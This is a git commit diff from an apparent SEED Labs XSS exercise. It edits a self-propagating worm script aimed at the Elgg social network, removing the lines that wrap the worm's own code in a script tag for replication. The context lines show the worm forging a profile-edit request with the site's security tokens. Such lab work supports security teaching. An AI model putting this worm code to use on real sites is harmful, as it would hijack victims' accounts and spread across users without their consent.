9789d5e0fac7fdc000c853aa99d27e1bf9887558
gnuttt <gt93cc@gmail.com>
2018-06-10 13:41:29 +0800

    self-propagating-worm.js

--- mySeedLab/XSS/self-propagating-worm.js
+++ mySeedLab/XSS/self-propagating-worm.js
@@ -26,11 +26,6 @@ if(user!='hackbiji'){
     victim.setRequestHeader("Connection","keep-alive");
     victim.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 
-    var sub_script_begin='<script id="worm" type="text\/javascript">';
-    var sub_script_end="<\/script>";
-    var sub_script=sub_script_begin.concat(hackbiji_self_worm,sub_script_end);
-    sub_script = escape(sub_script);
-
     var content="__elgg_token=".concat(elgg.security.token.__elgg_token);
     content = content.concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts);
     content = content.concat("&name=").concat(user);
